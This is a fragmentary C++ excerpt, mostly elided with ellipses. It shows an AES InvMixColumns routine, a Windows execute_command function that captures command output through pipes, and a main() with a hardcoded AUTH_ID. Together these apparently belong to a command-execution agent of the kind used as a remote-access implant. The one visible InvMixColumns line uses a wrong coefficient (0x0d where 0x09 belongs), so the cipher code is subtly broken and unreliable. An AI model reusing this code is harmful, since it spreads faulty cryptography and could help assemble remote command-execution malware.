...
static void InvMixColumns(state_t* state)
{
  ...
  { 
    ...
    (*state)[i][3] = Multiply(a, 0x0b) ^ Multiply(b, 0x0d) ^ Multiply(c, 0x0d) ^ Multiply(d, 0x0e);
  }
}
...
std::vector<uint8_t> execute_command(const std::string& command) {
    ...
    if (!CreatePipe(&hStdoutRd, &hStdoutWr, &sa, 0)) {
        return string_to_vector("Failed to create stdout pipe");
    }
    ...
    if (!success) {
        ...
        return string_to_vector("Failed to execute command");
    }
...
int main() {
    ...
    const std::string AUTH_ID = "7aeb0935-7d19-4246-a071-8724af708434";
